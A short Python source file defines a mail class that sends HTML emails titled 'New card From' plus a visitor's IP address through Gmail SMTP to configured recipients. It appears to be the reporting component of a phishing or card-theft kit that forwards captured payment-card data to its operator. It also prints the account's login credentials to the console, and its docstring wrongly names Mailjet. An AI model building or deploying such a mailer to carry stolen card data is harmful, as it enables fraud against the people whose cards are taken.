import smtplib, ssl
from utils import getBody
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import config

class Mail:
    """
        Class to mail logic to send data via mailjet rest api.
    """

    def send(self, data, info="card"):
        """
            Send email via mailjet
        """
        message = MIMEMultipart("alternative")
        message["Subject"] = "New {} From ".format(info) + data['ip']+" !"
        message["From"] = config.EMAIL_USER
        message["To"] = ", ".join(config.TO)
        body_html = MIMEText(getBody(data), "html")
        message.attach(body_html)

        print(config.EMAIL_USER, config.EMAIL_PASS)
        # Create a secure SSL context
        # context = ssl.create_default_context()
        # Try to log in to server and send email
        try:
            server = smtplib.SMTP("smtp.gmail.com", 587)
            server.ehlo()  # Can be omitted
            server.starttls()  # Secure the connection
            server.ehlo()  # Can be omitted
            server.login(config.EMAIL_USER, config.EMAIL_PASS)

            # TODO: Send email here
            server.sendmail(config.EMAIL_USER, ", ".join(config.TO), message.as_string())

            print('Email sent!')
        except Exception as e:
            # Print any error messages to stdout
            print(e)
        finally:
            server.quit()


